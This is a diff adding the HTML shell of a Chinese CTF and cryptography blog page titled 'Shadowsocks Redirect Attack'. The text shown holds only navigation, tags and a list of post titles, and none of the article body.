@@ -1,0 +1,1569 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  <title>Shadowsocks Redirect Attack | Van1sh的小屋</title>
+  <meta name="keywords" content=" Shadowsocks ">
+  <meta name="description" content="Shadowsocks Redirect Attack | Van1sh的小屋">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="&amp;emsp;&amp;emsp; Van1sh，也用ID：V、Vanish，主要是有的网站昵称至少两个字符，Vanish也容易被注册&amp;emsp;现就读于杭州电子科技大学。是一只究极大菜鸡加懒狗。自2019.2.14的2019Hctf-Game接触CTF，由于零基础，目前还菜的一批，可能还会继续菜下去。现在还只会做一点Crypto方向的题，其他什么Web，Pwn，Reverse, Misc….俺都不知道。">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Van1sh的小屋">
+<meta property="og:url" content="http://jayxv.github.io/about/index.html">
+<meta property="og:site_name" content="Van1sh的小屋">
+<meta property="og:description" content="&amp;emsp;&amp;emsp; Van1sh，也用ID：V、Vanish，主要是有的网站昵称至少两个字符，Vanish也容易被注册&amp;emsp;现就读于杭州电子科技大学。是一只究极大菜鸡加懒狗。自2019.2.14的2019Hctf-Game接触CTF，由于零基础，目前还菜的一批，可能还会继续菜下去。现在还只会做一点Crypto方向的题，其他什么Web，Pwn，Reverse, Misc….俺都不知道。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2020-04-30T11:44:36.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Van1sh的小屋">
+<meta name="twitter:description" content="&amp;emsp;&amp;emsp; Van1sh，也用ID：V、Vanish，主要是有的网站昵称至少两个字符，Vanish也容易被注册&amp;emsp;现就读于杭州电子科技大学。是一只究极大菜鸡加懒狗。自2019.2.14的2019Hctf-Game接触CTF，由于零基础，目前还菜的一批，可能还会继续菜下去。现在还只会做一点Crypto方向的题，其他什么Web，Pwn，Reverse, Misc….俺都不知道。">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.0.1" rel="stylesheet">
+
+<link href="/css/hl_theme/sublime.css?v=1.0.1" rel="stylesheet">
+
+<link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">
+<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="/js/jquery.autocomplete.min.js?v=1.0.1"></script>
+
+<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.min.js"></script>
+
+<script src="/js/iconfont.js?v=1.0.1"></script>
+
+</head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="false">
+  <input class="theme_blog_path" value>
+</div>
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/" class="avatar_target">
+    <img class="avatar" src="/img/avatar.jpg" />
+</a>
+<div class="author">
+    <span>Van1sh</span>
+</div>
+
+<div class="icon">
+    
+        
+    
+        
+        <a title="github" href="https://github.com/JayxV" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-github"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+        <a title="email" href="mailto:643713081@qq.com" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-email"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="qq" href="http://wpa.qq.com/msgrd?v=3&uin=643713081&site=qq&menu=yes" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-qq"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+    
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li><div class="all active">全部文章<small>(57)</small></div></li>
+    
+        
+            
+            <li><div data-rel="比赛小屋">比赛小屋<small>(18)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="工具小屋">工具小屋<small>(5)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="合约小屋"><i class="fold iconfont icon-right"></i>合约小屋<small>(8)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="contract">contract<small>(6)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="区块链靶场">区块链靶场<small>(1)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="密码小屋"><i class="fold iconfont icon-right"></i>密码小屋<small>(17)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="ECC">ECC<small>(1)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="Paillier">Paillier<small>(1)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="Lattice">Lattice<small>(1)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="Stream">Stream<small>(1)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="Knapsack">Knapsack<small>(1)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="Rsa">Rsa<small>(3)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="Block">Block<small>(3)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="Basic">Basic<small>(2)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="CTF">CTF<small>(1)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="RSA">RSA<small>(1)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
+                
+            </li>
+            
+        
+    
+        
+            
+        
+    
+        
+            
+            <li><div data-rel="协议小屋">协议小屋<small>(2)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+            <li><div data-rel="Web小屋"><i class="fold iconfont icon-right"></i>Web小屋<small>(3)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="Files related">Files related<small>(1)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="SQL">SQL<small>(1)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="XSS">XSS<small>(1)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
+                
+            </li>
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+            <li><div data-rel="论文小屋">论文小屋<small>(1)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+            <li><div data-rel="逆向小屋"><i class="fold iconfont icon-right"></i>逆向小屋<small>(1)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="patch">patch<small>(1)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
+                
+            </li>
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+            <li><div data-rel="漏洞小屋">漏洞小屋<small>(1)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+            <li><div data-rel="小书屋">小书屋<small>(1)</small></div>
+                
+            </li>
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+    
+    
+    
+    
+    </div>
+    <div><a class="about  hasFriend  site_url"  href="/about">关于</a><a style="width: 50%"  class="friends">友链</a></div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="57">
+<input type="hidden" id="yelog_site_word_count" value="270.8k">
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="back-title-list"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="http://www.fzwjscj.xyz/">fzwjscj</a></li>
+            
+            <li><a target="_blank" href="http://dldxz.cn/">DLDXZ</a></li>
+            
+            <li><a target="_blank" href="http://fanda.cloud/">fanda</a></li>
+            
+            <li><a target="_blank" href="http://passingfoam.com/">PassingFoam&#39;s blog</a></li>
+            
+            <li><a target="_blank" href="https://eqqie.cn/">赤道企鹅</a></li>
+            
+            <li><a target="_blank" href="http://blog.ragdoll.work/">咲夜南梦</a></li>
+            
+            <li><a target="_blank" href="https://www.zhaoj.in/">glzjin</a></li>
+            
+            <li><a target="_blank" href="https://coinc1dens.github.io/">Coinc1dens</a></li>
+            
+            <li><a target="_blank" href="http://blog.soreatu.com/">soreatu</a></li>
+            
+            <li><a target="_blank" href="http://www.ga1axy.top/">盖乐希</a></li>
+            
+            <li><a target="_blank" href="https://shawroot.cc/">Root.</a></li>
+            
+            <li><a target="_blank" href="https://l1near.top/">l1near</a></li>
+            
+            <li><a target="_blank" href="https://0xdktb.top/">0xDktb</a></li>
+            
+            <li><a target="_blank" href="https://www.wootec.top/">Reverier</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <form onkeydown="if(event.keyCode === 13){return false;}">
+        <input id="local-search-input" class="search" type="text" placeholder="以 in: 开头进行全文搜索" />
+        <i class="cross"></i>
+        <span>
+            <label for="tagswitch">Tags:</label>
+            <input id="tagswitch" type="checkbox" style="display: none" />
+            <i id="tagsWitchIcon"></i>
+        </span>
+    </form>
+    <div class="tags-list">
+    
+    <li class="article-tag-list-item">
+        <a class="color4">Write Up</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">docker</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">Sage</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">CTF</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">ECC</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">TLS 1.2</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">Crypto</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">Paillier</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">Web</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">Files</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">Serialization</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">Lattice</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">Dsa</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">LCG</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">Rc4</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">SM4</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">paper</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">small private exponent</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">SQL</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">python</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">Knapsack</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">Rsa</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">continued_fraction</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">RE</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">DES</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">差分密码分析</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">操作模式</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">number theory</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">Abstract algebra</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">ETH</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">SPN</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">线性密码分析</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">Book</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">Shadowsocks</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">Nmap</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">XSS</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">Linux</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">Coppersmith’s Method</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">book</a>
+    </li>
+    
+    <div class="clearfix"></div>
+</div>
+
+    
+    <div id="local-search-result">
+
+    </div>
+    
+    <nav id="title-list-nav">
+        
+        <a id="top" class="密码小屋 Basic "
+           href="/2020/05/27/密码学学习笔记之introduction to mathematical cryptography/"
+           data-tag="Book"
+           data-author="Van1sh" >
+            <span class="post-title" title="密码学学习笔记 之 introduction to mathematical cryptography">密码学学习笔记 之 introduction to mathematical cryptography</span>
+            <span class="post-date" title="2020-05-27 21:05:00">2020/05/27</span>
+        </a>
+        
+        <a  class="漏洞小屋 "
+           href="/2023/01/30/Shadowsocks Redirect Attack/"
+           data-tag="Shadowsocks"
+           data-author="Van1sh" >
+            <span class="post-title" title="Shadowsocks Redirect Attack">Shadowsocks Redirect Attack</span>
+            <span class="post-date" title="2023-01-30 17:14:00">2023/01/30</span>
+        </a>
+        
+        <a  class="协议小屋 "
+           href="/2022/12/15/TLS1.2协议分析（二）/"
+           data-tag="TLS 1.2"
+           data-author="Van1sh" >
+            <span class="post-title" title="TLS 1.2 协议（二）">TLS 1.2 协议（二）</span>
+            <span class="post-date" title="2022-12-15 10:24:00">2022/12/15</span>
+        </a>
+        
+        <a  class="协议小屋 "
+           href="/2022/12/08/TLS1.2协议分析（一）/"
+           data-tag="TLS 1.2"
+           data-author="Van1sh" >
+            <span class="post-title" title="TLS 1.2 协议（一）">TLS 1.2 协议（一）</span>
+            <span class="post-date" title="2022-12-08 21:10:00">2022/12/08</span>
+        </a>
+        
+        <a  class="密码小屋 "
+           href="/2022/11/15/密码学学习笔记之连分数/"
+           data-tag="continued_fraction"
+           data-author="Van1sh" >
+            <span class="post-title" title="密码学学习笔记之连分数">密码学学习笔记之连分数</span>
+            <span class="post-date" title="2022-11-15 17:59:00">2022/11/15</span>
+        </a>
+        
+        <a  class="论文小屋 "
+           href="/2022/10/17/Generalization of Some Attacks on RSA with Small Prime Combination and Small Private Exponent/"
+           data-tag="paper,small private exponent"
+           data-author="Van1sh" >
+            <span class="post-title" title="Generalization of Some Attacks on RSA with Small Prime Combination and Small Private Exponent">Generalization of Some Attacks on RSA with Small Prime Combination and Small Private Exponent</span>
+            <span class="post-date" title="2022-10-17 15:31:00">2022/10/17</span>
+        </a>
+        
+        <a  class="比赛小屋 "
+           href="/2022/09/14/2022 cryptoctf/"
+           data-tag=""
+           data-author="Van1sh" >
+            <span class="post-title" title="2022 CryptoCTF">2022 CryptoCTF</span>
+            <span class="post-date" title="2022-09-14 17:16:00">2022/09/14</span>
+        </a>
+        
+        <a  class="比赛小屋 "
+           href="/2022/08/30/2021 cryptoctf/"
+           data-tag=""
+           data-author="Van1sh" >
+            <span class="post-title" title="2021 CryptoCTF">2021 CryptoCTF</span>
+            <span class="post-date" title="2022-08-30 13:30:00">2022/08/30</span>
+        </a>
+        
+        <a  class="合约小屋 contract "
+           href="/2022/06/29/区块链学习笔记之2022ACTF-bet2loss/"
+           data-tag="CTF"
+           data-author="Van1sh" >
+            <span class="post-title" title="区块链学习笔记之2022ACTF—bet2loss">区块链学习笔记之2022ACTF—bet2loss</span>
+            <span class="post-date" title="2022-06-29 15:23:00">2022/06/29</span>
+        </a>
+        
+        <a  class="合约小屋 contract "
+           href="/2022/04/19/区块链学习笔记之2022starCTF/"
+           data-tag="CTF"
+           data-author="Van1sh" >
+            <span class="post-title" title="区块链学习笔记之2022starCTF——TreasureHunter">区块链学习笔记之2022starCTF——TreasureHunter</span>
+            <span class="post-date" title="2022-04-19 15:23:00">2022/04/19</span>
+        </a>
+        
+        <a  class="合约小屋 区块链靶场 "
+           href="/2022/03/08/区块链靶场刷题之cpaturetheether/"
+           data-tag="CTF"
+           data-author="Van1sh" >
+            <span class="post-title" title="cpature the ether">cpature the ether</span>
+            <span class="post-date" title="2022-03-08 11:03:00">2022/03/08</span>
+        </a>
+        
+        <a  class="比赛小屋 "
+           href="/2022/02/28/2022 SUSCTF/"
+           data-tag="Write Up"
+           data-author="Van1sh" >
+            <span class="post-title" title="2022 SUSCTF">2022 SUSCTF</span>
+            <span class="post-date" title="2022-02-28 11:18:35">2022/02/28</span>
+        </a>
+        
+        <a  class="比赛小屋 "
+           href="/2022/02/22/2021TQLCTF/"
+           data-tag="Write Up"
+           data-author="Van1sh" >
+            <span class="post-title" title="2022 TQLCTF">2022 TQLCTF</span>
+            <span class="post-date" title="2022-02-22 22:22:22">2022/02/22</span>
+        </a>
+        
+        <a  class="合约小屋 contract "
+           href="/2022/02/18/区块链学习笔记之BalsnCTF 2019 Bank/"
+           data-tag="CTF"
+           data-author="Van1sh" >
+            <span class="post-title" title="区块链学习笔记之Balsn CTF 2019 - Bank">区块链学习笔记之Balsn CTF 2019 - Bank</span>
+            <span class="post-date" title="2022-02-18 14:45:00">2022/02/18</span>
+        </a>
+        
+        <a  class="合约小屋 contract "
+           href="/2022/02/15/区块链学习笔记之BalsnCTF 2020 IdleGame/"
+           data-tag="CTF"
+           data-author="Van1sh" >
+            <span class="post-title" title="区块链学习笔记之BalsnCTF 2020 IdleGame">区块链学习笔记之BalsnCTF 2020 IdleGame</span>
+            <span class="post-date" title="2022-02-15 15:39:00">2022/02/15</span>
+        </a>
+        
+        <a  class="合约小屋 contract "
+           href="/2022/02/11/区块链学习笔记之paradigm-CTF babysandbox/"
+           data-tag="CTF"
+           data-author="Van1sh" >
+            <span class="post-title" title="区块链学习笔记之paradigm-CTF babysandbox">区块链学习笔记之paradigm-CTF babysandbox</span>
+            <span class="post-date" title="2022-02-11 16:22:00">2022/02/11</span>
+        </a>
+        
+        <a  class="合约小屋 contract "
+           href="/2022/01/23/区块链学习笔记之RealWorld体验赛/"
+           data-tag="CTF"
+           data-author="Van1sh" >
+            <span class="post-title" title="区块链学习笔记之RealWorld体验赛——TransferFrom">区块链学习笔记之RealWorld体验赛——TransferFrom</span>
+            <span class="post-date" title="2022-01-23 00:11:00">2022/01/23</span>
+        </a>
+        
+        <a  class="合约小屋 "
+           href="/2021/12/22/区块链学习笔记之初探以太坊/"
+           data-tag="ETH"
+           data-author="Van1sh" >
+            <span class="post-title" title="区块链学习笔记之初探以太坊">区块链学习笔记之初探以太坊</span>
+            <span class="post-date" title="2021-12-22 10:16:00">2021/12/22</span>
+        </a>
+        
+        <a  class="比赛小屋 "
+           href="/2021/08/23/2021 祥云杯/"
+           data-tag="Write Up"
+           data-author="Van1sh" >
+            <span class="post-title" title="2021 祥云杯">2021 祥云杯</span>
+            <span class="post-date" title="2021-08-23 14:07:00">2021/08/23</span>
+        </a>
+        
+        <a  class="密码小屋 Block "
+           href="/2021/08/06/密码学学习笔记之线性分析入门篇——EzSPN/"
+           data-tag="SPN,线性密码分析"
+           data-author="Van1sh" >
+            <span class="post-title" title="密码学学习笔记 之 线性分析入门篇——EzSPN">密码学学习笔记 之 线性分析入门篇——EzSPN</span>
+            <span class="post-date" title="2021-08-06 09:24:25">2021/08/06</span>
+        </a>
+        
+        <a  class="密码小屋 Block "
+           href="/2021/07/16/密码学学习笔记之差分分析入门篇——四轮DES/"
+           data-tag="DES,差分密码分析"
+           data-author="Van1sh" >
+            <span class="post-title" title="密码学学习笔记 之 差分分析入门篇——四轮DES">密码学学习笔记 之 差分分析入门篇——四轮DES</span>
+            <span class="post-date" title="2021-07-16 09:24:25">2021/07/16</span>
+        </a>
+        
+        <a  class="比赛小屋 "
+           href="/2021/04/04/2021HFCTF/"
+           data-tag="Write Up"
+           data-author="Van1sh" >
+            <span class="post-title" title="2021 HFCTF">2021 HFCTF</span>
+            <span class="post-date" title="2021-04-04 11:02:47">2021/04/04</span>
+        </a>
+        
+        <a  class="逆向小屋 patch "
+           href="/2021/03/27/逆向学习笔记之drinkSomeTea/"
+           data-tag="RE"
+           data-author="Van1sh" >
+            <span class="post-title" title="逆向学习笔记 之 drinkSomeTea">逆向学习笔记 之 drinkSomeTea</span>
+            <span class="post-date" title="2021-03-27 19:22:00">2021/03/27</span>
+        </a>
+        
+        <a  class="密码小屋 "
+           href="/2021/01/01/密码学学习笔记之密码学随笔/"
+           data-tag="Crypto"
+           data-author="Van1sh" >
+            <span class="post-title" title="密码学学习笔记 之 密码学随笔">密码学学习笔记 之 密码学随笔</span>
+            <span class="post-date" title="2021-01-01 00:00:00">2021/01/01</span>
+        </a>
+        
+        <a  class="密码小屋 RSA "
+           href="/2020/12/18/密码学学习笔记之RSA的一些套路/"
+           data-tag="Rsa"
+           data-author="Van1sh" >
+            <span class="post-title" title="密码学学习笔记 之 RSA的一些套路">密码学学习笔记 之 RSA的一些套路</span>
+            <span class="post-date" title="2020-12-18 14:32:00">2020/12/18</span>
+        </a>
+        
+        <a  class="密码小屋 CTF "
+           href="/2020/12/18/密码学学习笔记之CTF/"
+           data-tag="CTF"
+           data-author="Van1sh" >
+            <span class="post-title" title="密码学学习笔记 之 CTF">密码学学习笔记 之 CTF</span>
+            <span class="post-date" title="2020-12-18 00:00:00">2020/12/18</span>
+        </a>
+        
+        <a  class="比赛小屋 "
+           href="/2020/12/10/2020RoarCTF/"
+           data-tag="Write Up"
+           data-author="Van1sh" >
+            <span class="post-title" title="2020 RoarCTF">2020 RoarCTF</span>
+            <span class="post-date" title="2020-12-10 10:00:00">2020/12/10</span>
+        </a>
+        
+        <a  class="比赛小屋 "
+           href="/2020/11/04/2020ByteCTF&X-NUCA部分密码学题解/"
+           data-tag="Write Up"
+           data-author="Van1sh" >
+            <span class="post-title" title="2020 ByteCTF&amp;X-NUCA">2020 ByteCTF&amp;X-NUCA</span>
+            <span class="post-date" title="2020-11-04 10:00:00">2020/11/04</span>
+        </a>
+        
+        <a  class="密码小屋 Rsa "
+           href="/2020/08/13/密码学学习笔记之coppersmith/"
+           data-tag="Coppersmith’s Method"
+           data-author="Van1sh" >
+            <span class="post-title" title="密码学学习笔记 之 Coppersmith’s Method">密码学学习笔记 之 Coppersmith’s Method</span>
+            <span class="post-date" title="2020-08-13 10:00:00">2020/08/13</span>
+        </a>
+        
+        <a  class="Web小屋 Files related "
+           href="/2020/08/09/Web学习笔记之文件与序列化/"
+           data-tag="Web,Files,Serialization"
+           data-author="Van1sh" >
+            <span class="post-title" title="Web学习笔记 之 文件与序列化">Web学习笔记 之 文件与序列化</span>
+            <span class="post-date" title="2020-08-09 14:16:00">2020/08/09</span>
+        </a>
+        
+        <a  class="Web小屋 SQL "
+           href="/2020/08/07/Web学习笔记之SQL注入/"
+           data-tag="Web,SQL"
+           data-author="Van1sh" >
+            <span class="post-title" title="Web学习笔记 之 SQL注入">Web学习笔记 之 SQL注入</span>
+            <span class="post-date" title="2020-08-07 13:18:00">2020/08/07</span>
+        </a>
+        
+        <a  class="Web小屋 XSS "
+           href="/2020/07/26/Web学习笔记之XSS/"
+           data-tag="Web,XSS"
+           data-author="Van1sh" >
+            <span class="post-title" title="Web学习笔记 之 XSS">Web学习笔记 之 XSS</span>
+            <span class="post-date" title="2020-07-26 10:44:00">2020/07/26</span>
+        </a>
+        
+        <a  class="密码小屋 Knapsack "
+           href="/2020/06/08/密码学学习笔记之knapsack/"
+           data-tag="Knapsack"
+           data-author="Van1sh" >
+            <span class="post-title" title="密码学学习笔记 之 knapsack">密码学学习笔记 之 knapsack</span>
+            <span class="post-date" title="2020-06-08 10:30:43">2020/06/08</span>
+        </a>
+        
+        <a  class="比赛小屋 "
+           href="/2020/05/26/2020BJD3rd/"
+           data-tag="Write Up"
+           data-author="Van1sh &amp; FzWjScJ" >
+            <span class="post-title" title="2020 BJD3rd">2020 BJD3rd</span>
+            <span class="post-date" title="2020-05-26 16:00:47">2020/05/26</span>
+        </a>
+        
+        <a  class="比赛小屋 "
+           href="/2020/05/24/2020GKCTF/"
+           data-tag="Write Up"
+           data-author="Van1sh" >
+            <span class="post-title" title="2020 GKCTF">2020 GKCTF</span>
+            <span class="post-date" title="2020-05-24 17:05:00">2020/05/24</span>
+        </a>
+        
+        <a  class="工具小屋 "
+           href="/2020/05/20/sage常用命令/"
+           data-tag="Sage"
+           data-author="Van1sh" >
+            <span class="post-title" title="sage常用命令">sage常用命令</span>
+            <span class="post-date" title="2020-05-20 11:22:00">2020/05/20</span>
+        </a>
+        
+        <a  class="密码小屋 Paillier "
+           href="/2020/05/14/密码学学习笔记之paillier cryptosystem/"
+           data-tag="Paillier"
+           data-author="Van1sh" >
+            <span class="post-title" title="密码学学习笔记 之 paillier cryptosystem">密码学学习笔记 之 paillier cryptosystem</span>
+            <span class="post-date" title="2020-05-14 11:00:19">2020/05/14</span>
+        </a>
+        
+        <a  class="密码小屋 Lattice "
+           href="/2020/05/12/密码学学习笔记之HNP/"
+           data-tag="Lattice,Dsa,LCG"
+           data-author="Van1sh" >
+            <span class="post-title" title="密码学学习笔记 之 HNP">密码学学习笔记 之 HNP</span>
+            <span class="post-date" title="2020-05-12 10:00:57">2020/05/12</span>
+        </a>
+        
+        <a  class="比赛小屋 "
+           href="/2020/05/10/2020网鼎杯/"
+           data-tag="Write Up"
+           data-author="Van1sh" >
+            <span class="post-title" title="2020 网鼎杯">2020 网鼎杯</span>
+            <span class="post-date" title="2020-05-10 21:15:00">2020/05/10</span>
+        </a>
+        
+        <a  class="密码小屋 ECC "
+           href="/2020/05/07/密码学学习笔记之NCCIP/"
+           data-tag="ECC"
+           data-author="Van1sh" >
+            <span class="post-title" title="密码学学习笔记 之 NCCIP">密码学学习笔记 之 NCCIP</span>
+            <span class="post-date" title="2020-05-07 10:30:43">2020/05/07</span>
+        </a>
+        
+        <a  class="比赛小屋 "
+           href="/2020/05/05/2020De1CTF/"
+           data-tag="Write Up"
+           data-author="Van1sh" >
+            <span class="post-title" title="2020 De1CTF">2020 De1CTF</span>
+            <span class="post-date" title="2020-05-05 15:57:00">2020/05/05</span>
+        </a>
+        
+        <a  class="密码小屋 Block "
+           href="/2020/03/03/密码学学习笔记之分组密码操作模式/"
+           data-tag="操作模式"
+           data-author="Van1sh" >
+            <span class="post-title" title="密码学学习笔记 之 分组密码操作模式">密码学学习笔记 之 分组密码操作模式</span>
+            <span class="post-date" title="2020-03-03 15:15:00">2020/03/03</span>
+        </a>
+        
+        <a  class="比赛小屋 "
+           href="/2020/02/18/2020hgame_week1/"
+           data-tag="Write Up"
+           data-author="Van1sh" >
+            <span class="post-title" title="2020 hgame week1">2020 hgame week1</span>
+            <span class="post-date" title="2020-02-18 16:22:35">2020/02/18</span>
+        </a>
+        
+        <a  class="密码小屋 Stream "
+           href="/2020/01/30/密码学学习笔记之RC4与SM4/"
+           data-tag="Rc4,SM4"
+           data-author="Van1sh" >
+            <span class="post-title" title="密码学学习笔记 之 RC4与SM4">密码学学习笔记 之 RC4与SM4</span>
+            <span class="post-date" title="2020-01-30 00:05:00">2020/01/30</span>
+        </a>
+        
+        <a  class="密码小屋 Rsa "
+           href="/2019/12/04/密码学学习笔记之浅析On r-th Root Extraction Algorithm in Fq/"
+           data-tag="Rsa"
+           data-author="Van1sh" >
+            <span class="post-title" title="密码学学习笔记 之 浅析On r-th Root Extraction Algorithm in Fq">密码学学习笔记 之 浅析On r-th Root Extraction Algorithm in Fq</span>
+            <span class="post-date" title="2019-12-04 14:30:46">2019/12/04</span>
+        </a>
+        
+        <a  class="密码小屋 Basic "
+           href="/2019/12/03/密码学学习笔记之数论四大定理及应用/"
+           data-tag="number theory,Abstract algebra"
+           data-author="Van1sh" >
+            <span class="post-title" title="密码学学习笔记 之 数论四大定理及应用">密码学学习笔记 之 数论四大定理及应用</span>
+            <span class="post-date" title="2019-12-03 15:30:25">2019/12/03</span>
+        </a>
+        
+        <a  class="密码小屋 Rsa "
+           href="/2019/11/11/密码学学习笔记之浅析Pollard's rho algorithm及其应用/"
+           data-tag="Rsa"
+           data-author="Van1sh" >
+            <span class="post-title" title="密码学学习笔记 之 浅析Pollard&#39;s rho algorithm及其应用">密码学学习笔记 之 浅析Pollard&#39;s rho algorithm及其应用</span>
+            <span class="post-date" title="2019-11-11 15:32:00">2019/11/11</span>
+        </a>
+        
+        <a  class="比赛小屋 "
+           href="/2019/11/08/2019UNCTF/"
+           data-tag="Write Up"
+           data-author="Van1sh" >
+            <span class="post-title" title="2019 UNCTF">2019 UNCTF</span>
+            <span class="post-date" title="2019-11-08 11:30:30">2019/11/08</span>
+        </a>
+        
+        <a  class="工具小屋 "
+           href="/2019/11/01/docker和docker-compose的安装/"
+           data-tag="docker"
+           data-author="Van1sh" >
+            <span class="post-title" title="安装Docker 和 Docker-Compose以及docker images的制作及上传">安装Docker 和 Docker-Compose以及docker images的制作及上传</span>
+            <span class="post-date" title="2019-11-01 21:00:00">2019/11/01</span>
+        </a>
+        
+        <a  class="工具小屋 "
+           href="/2019/09/12/Linux 基础/"
+           data-tag="Linux"
+           data-author="Vanish" >
